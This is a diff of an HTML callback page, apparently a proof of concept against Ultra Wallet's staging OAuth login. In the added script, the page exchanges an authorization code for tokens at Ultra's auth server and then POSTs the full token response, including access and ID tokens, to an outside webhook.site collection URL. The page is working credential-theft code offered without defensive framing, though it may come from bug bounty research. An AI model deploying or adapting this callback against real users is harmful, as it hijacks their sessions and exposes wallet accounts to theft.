@@ -1,54 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ultra Wallet PoC Callback</title>
+  <title>Ultra Wallet PoC - Callback</title>
 </head>
 <body>
-  <h1>Ultra Wallet PoC - Callback</h1>
-  <pre id="output">Processing...</pre>
+  <h1>✅ Callback Received</h1>
+  <pre id="result">Waiting...</pre>
 
   <script>
-    async function exchangeCodeForToken() {
-      const codeVerifier = '47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU'; // Must match the code_challenge used with method=plain
-      const params = new URLSearchParams(window.location.search);
-      const code = params.get('code');
+    async function exchangeCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get("code");
+      const codeVerifier = sessionStorage.getItem("code_verifier");
 
-      if (!code) {
-        document.getElementById('output').textContent = '❌ No code found in URL';
-        return;
-      }
+      const data = new URLSearchParams({
+        grant_type: "authorization_code",
+        client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
+        code,
+        code_verifier: codeVerifier,
+        redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
+      });
 
-      const tokenEndpoint = 'https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token';
+      const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: data
+      });
 
-      const body = new URLSearchParams();
-      body.append('grant_type', 'authorization_code');
-      body.append('code', code);
-      body.append('redirect_uri', 'https://nathanogaga118.github.io/ultra-poc/callback.html');
-      body.append('client_id', '2f6ca3c9-87ec-4042-a464-21349485a16f');
-      body.append('code_verifier', codeVerifier);
+      const result = await response.json();
+      document.getElementById("result").textContent = JSON.stringify(result, null, 2);
 
-      try {
-        const response = await fetch(tokenEndpoint, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-          },
-          body: body.toString()
-        });
-
-        const result = await response.json();
-
-        document.getElementById('output').textContent = JSON.stringify(result, null, 2);
-
-        console.log('✅ Access Token:', result.access_token);
-        console.log('✅ ID Token:', result.id_token);
-      } catch (err) {
-        console.error('❌ Token exchange failed:', err);
-        document.getElementById('output').textContent = '❌ Token exchange failed. Check console.';
-      }
+      // Send to your webhook
+      await fetch("https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(result)
+      });
     }
 
-    exchangeCodeForToken();
+    exchangeCode();
   </script>
 </body>
 </html>
